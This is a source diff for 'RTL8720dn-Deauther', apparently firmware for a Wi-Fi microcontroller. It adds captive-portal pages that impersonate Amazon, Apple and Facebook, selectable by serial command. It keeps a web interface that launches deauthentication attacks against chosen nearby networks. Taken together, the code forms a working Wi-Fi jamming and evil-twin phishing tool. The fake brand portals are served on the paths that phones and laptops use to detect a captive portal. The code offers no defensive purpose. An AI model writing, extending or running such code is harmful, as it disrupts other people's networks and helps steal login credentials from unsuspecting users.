@@ -12,6 +12,10 @@
 #include "WiFiClient.h"
 
 #include "dns.h"
+#include "portals/default.h"
+#include "portals/amazon.h"
+#include "portals/apple.h"
+#include "portals/facebook.h"
 
 // LEDs:
 //  Red: System usable, Web server active etc.
@@ -222,142 +226,44 @@ String makeRedirect(String url) {
   return response;
 }
 
-void handleRoot(WiFiClient &client) {
-  String response = makeResponse(200, "text/html") + R"(
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>RTL8720dn-Deauther</title>
-      <style>
-          body {
-              font-family: Arial, sans-serif;
-              line-height: 1.6;
-              color: #333;
-              max-width: 800px;
-              margin: 0 auto;
-              padding: 20px;
-              background-color: #f4f4f4;
-          } 
-          h1, h2 {
-              color: #2c3e50;
-          }
-          table {
-              width: 100%;
-              border-collapse: collapse;
-              margin-bottom: 20px;
-          }
-          th, td {
-              padding: 12px;
-              text-align: left;
-              border-bottom: 1px solid #ddd;
-          }
-          th {
-              background-color: #3498db;
-              color: white;
-          }
-          tr:nth-child(even) {
-              background-color: #f2f2f2;
-          }
-          form {
-              background-color: white;
-              padding: 20px;
-              border-radius: 5px;
-              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-              margin-bottom: 20px;
-          }
-          input[type="submit"] {
-              padding: 10px 20px;
-              border: none;
-              background-color: #3498db;
-              color: white;
-              border-radius: 4px;
-              cursor: pointer;
-              transition: background-color 0.3s;
-          }
-          input[type="submit"]:hover {
-              background-color: #2980b9;
-          }
-      </style>
-  </head>
-  <body>
-      <h1>RTL8720dn-Deauther</h1>
 
-      <h2>WiFi Networks</h2>
-      <form method="post" action="/deauth">
-          <table>
-              <tr>
-                  <th>Select</th>
-                  <th>Number</th>
-                  <th>SSID</th>
-                  <th>BSSID</th>
-                  <th>Channel</th>
-                  <th>RSSI</th>
-                  <th>Frequency</th>
-              </tr>
-  )";
+enum WebPortalType {
+    DefaultPortal,
+    WaitPortal,
+    AmazonPortal,
+    ApplePortal,
+    FacebookPortal
+    // Add more as needed
+};
 
-  for (uint32_t i = 0; i < scan_results.size(); i++) {
-    response += "<tr>";
-    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
-    response += "<td>" + String(i) + "</td>";
-    response += "<td>" + scan_results[i].ssid + "</td>";
-    response += "<td>" + scan_results[i].bssid_str + "</td>";
-    response += "<td>" + String(scan_results[i].channel) + "</td>";
-    response += "<td>" + String(scan_results[i].rssi) + "</td>";
-    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
-    response += "</tr>";
-  }
+WebPortalType currentPortal = DefaultPortal;
 
-  response += R"(
-        </table>
-          <p>Reason code:</p>
-          <input type="text" name="reason" placeholder="Reason code">
-          <input type="submit" value="Launch Attack">
-      </form>
-
-      <form method="post" action="/rescan">
-          <input type="submit" value="Rescan networks">
-      </form>
-
-      <h2>Reason Codes</h2>
-    <table>
-        <tr>
-            <th>Code</th>
-            <th>Meaning</th>
-        </tr>
-        <tr><td>0</td><td>Reserved.</td></tr>
-        <tr><td>1</td><td>Unspecified reason.</td></tr>
-        <tr><td>2</td><td>Previous authentication no longer valid.</td></tr>
-        <tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>
-        <tr><td>4</td><td>Disassociated due to inactivity.</td></tr>
-        <tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>
-        <tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>
-        <tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>
-        <tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>
-        <tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>
-        <tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>
-        <tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>
-        <tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>
-        <tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>
-        <tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>
-        <tr><td>15</td><td>4-Way Handshake timeout.</td></tr>
-        <tr><td>16</td><td>Group Key Handshake timeout.</td></tr>
-        <tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>
-        <tr><td>18</td><td>Invalid group cipher.</td></tr>
-        <tr><td>19</td><td>Invalid pairwise cipher.</td></tr>
-        <tr><td>20</td><td>Invalid AKMP.</td></tr>
-        <tr><td>21</td><td>Unsupported RSNE version.</td></tr>
-        <tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>
-        <tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>
-        <tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>
-    </table>
-  </body>
-  </html>
-  )";
-
-  client.write(response.c_str());
+void handleRoot(WiFiClient &client, WebPortalType portalType = DefaultPortal) {
+    String response = makeResponse(200, "text/html");
+    if (portalType == WaitPortal) {
+        response += PORTAL_WAIT;
+    } else if (portalType == DefaultPortal) {
+        response += PORTAL_DEFAULT_TOP;
+        for (uint32_t i = 0; i < scan_results.size(); i++) {
+            response += "<tr>";
+            response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
+            response += "<td>" + String(i) + "</td>";
+            response += "<td>" + scan_results[i].ssid + "</td>";
+            response += "<td>" + scan_results[i].bssid_str + "</td>";
+            response += "<td>" + String(scan_results[i].channel) + "</td>";
+            response += "<td>" + String(scan_results[i].rssi) + "</td>";
+            response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
+            response += "</tr>";
+        }
+        response += PORTAL_DEFAULT_BOTTOM;
+    } else if (portalType == AmazonPortal) {
+      response += PORTAL_AMAZON;
+    } else if (portalType == ApplePortal) {
+      response += PORTAL_APPLE;
+    } else if (portalType == FacebookPortal) {
+      response += PORTAL_FACEBOOK;
+    }
+    client.write(response.c_str());
 }
 
 void handle404(WiFiClient &client) {
@@ -399,24 +305,28 @@ void printFreeHeap() {
 }
 */
 
-int cmd_wifi(){
+int cmd_wifi(bool state){
   //DEBUG_SER_PRINTLN((int)dataArray[0]);
-  if((int)dataArray[0] == 49){
+  switch (state){
+    case true:
       DEBUG_SER_PRINTLN("Turning on wifi...");
       if (wifiRunning == NULL){
-        xTaskCreate(clientHandler, "clientConnected", 1024, NULL, 1, &wifiRunning);
 
         start_DNS_Server(); // This function is from dns.cpp
 
         WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
         DEBUG_SER_PRINTLN("Wifi on!");
 
+        xTaskCreate(clientHandler, "clientConnected", 1024, NULL, 1, &wifiRunning);
+
+        
+        break;
       } else{
         DEBUG_SER_PRINTLN("WiFi server is already on.");
+        break;
       }
 
-  }
-  else if((int)dataArray[0] == 48){
+    case false:
       DEBUG_SER_PRINTLN("Turning off wifi server...");
       if (wifiRunning != NULL) {
         
@@ -434,8 +344,10 @@ int cmd_wifi(){
         unbind_dns();
 
 
-        vTaskDelay(500 / portTICK_PERIOD_MS);
+        
         wifi_off();
+
+        vTaskDelay(2000 / portTICK_PERIOD_MS);
 
         digitalWrite(LED_G, LOW);
         
@@ -445,15 +357,14 @@ int cmd_wifi(){
 
         vTaskDelay(500 / portTICK_PERIOD_MS);
         WiFi.status();
-        
+        break;
       } else{
         DEBUG_SER_PRINTLN("WiFi server is already off.");
-        return 0;
+        break;
       }
   }
-  else{
-      DEBUG_SER_PRINTLN("Invalid command.");
-  }
+  
+  //DEBUG_SER_PRINTLN("Invalid command.");
   return 0;
 }
 
@@ -643,7 +554,33 @@ void read_line(){
         break;
       case 'w':
         DEBUG_SER_PRINTLN("Wifi");
-        cmd_wifi();
+
+        char data1 = receivedBytes[1];
+
+        DEBUG_SER_PRINTLN(data1);
+        switch (data1){
+          case '1':
+            currentPortal = DefaultPortal;
+            cmd_wifi(1); 
+            break;
+          case '2':
+            currentPortal = AmazonPortal;
+            cmd_wifi(1);
+            break;
+          case '3':
+            currentPortal = ApplePortal;
+            cmd_wifi(1);
+            break;
+          case '4':
+            currentPortal = FacebookPortal;
+            cmd_wifi(1);
+            break;
+          case '0':
+            cmd_wifi(0);
+            break;
+        }
+
+
         break;
     }
 
@@ -665,64 +602,71 @@ void mainProgram(void *pvParameters){
 
 
 void clientHandler(void *pvParameters){
-  (void)pvParameters;
-  while(true){
-    WiFiClient client = server.available();
-    if (client.connected()) {
-      digitalWrite(LED_G, HIGH);
-      String request = "";
+    (void)pvParameters;
+    while(true){
+        WiFiClient client = server.available();
+        if (client.connected()) {
+            digitalWrite(LED_G, HIGH);
+            String request = "";
 
-      unsigned long timeout = millis();
-      while (client.connected() && millis() - timeout < 2000) {
-        while (client.available()) {
-          char c = client.read();
-          request += c;
-          timeout = millis(); // reset timeout on new data
-        }
-        vTaskDelay(10 / portTICK_PERIOD_MS);
-      }
-
-      if (request.length() > 0) {
-        DEBUG_SER_PRINT(request);
-        String path = parseRequest(request);
-        DEBUG_SER_PRINT("\nRequested path: " + path + "\n");
-
-
-        if (path == "/" || path.startsWith("/generate_204") || path.startsWith("/hotspot-detect.html") || path.startsWith("/connecttest.txt") || path.startsWith("/gen_204")) {
-          handleRoot(client);
-        } else if (path == "/rescan") {
-          client.write(makeRedirect("/").c_str());
-          if (scanInProcess == NULL) {
-            xTaskCreate(scanNetworks, "networkScan", 1024, NULL, 1, &scanInProcess);
-          } else {
-            DEBUG_SER_PRINTLN("Task already running!");
-          }
-        } else if (path == "/deauth") {
-          auto post_data = parsePost(request);
-          for (auto &param : post_data) {
-            if (param.first == "network") {
-              DEBUG_SER_PRINTLN(param.second.toInt());
-              createNewDeauthTask(param.second.toInt(), 2);
-            } else if (param.first == "reason") {
-              deauth_reason = param.second.toInt();
+            unsigned long timeout = millis();
+            while (client.connected() && millis() - timeout < 2000) {
+                while (client.available()) {
+                    char c = client.read();
+                    request += c;
+                    timeout = millis(); // reset timeout on new data
+                }
+                vTaskDelay(10 / portTICK_PERIOD_MS);
             }
-          }
-        } else {
-          handleRoot(client);
-          //handle404(client);
+
+            if (request.length() > 0) {
+                DEBUG_SER_PRINT(request);
+                String path = parseRequest(request);
+                DEBUG_SER_PRINT("\nRequested path: " + path + "\n");
+
+                if (
+                    path == "/" ||
+                    path.startsWith("/generate_204") ||
+                    path.startsWith("/hotspot-detect.html") ||
+                    path.startsWith("/connecttest.txt") ||
+                    path.startsWith("/gen_204") ||
+                    path == "/deauth"
+                ) {
+                    if (path == "/deauth") {
+                        auto post_data = parsePost(request);
+                        for (auto &param : post_data) {
+                            if (param.first == "network") {
+                                createNewDeauthTask(param.second.toInt(), 2);
+                            } else if (param.first == "reason") {
+                                deauth_reason = param.second.toInt();
+                            }
+                        }
+                    }
+                    handleRoot(client, currentPortal); // Always serve the portal page
+                } else if (path == "/rescan") {
+                    // Serve the "please wait" page from web_root.h
+                    handleRoot(client, WaitPortal);
+                    client.stop();
+
+                    // Start the scan (portal will be unavailable during scan)
+                    vTaskDelay(3000 / portTICK_PERIOD_MS);
+                    if (scanInProcess == NULL) {
+                        xTaskCreate(scanNetworks, "networkScan", 1024, NULL, 1, &scanInProcess);
+                    }
+                    // Don't serve handleRoot here, as the scan will block AP
+                } else {
+                    handle404(client);
+                }
+            } else {
+                DEBUG_SER_PRINTLN("⚠️ No request received.");
+            }
+
+            client.stop();
+            digitalWrite(LED_G, LOW);
         }
-      } else {
-        DEBUG_SER_PRINTLN("⚠️ No request received.");
-      }
-
-      client.stop();
-      digitalWrite(LED_G, LOW);
+        //vTaskDelay(10 / portTICK_PERIOD_MS);
     }
-
-    //vTaskDelay(10 / portTICK_PERIOD_MS);
-  }
 }
-
 
 
 
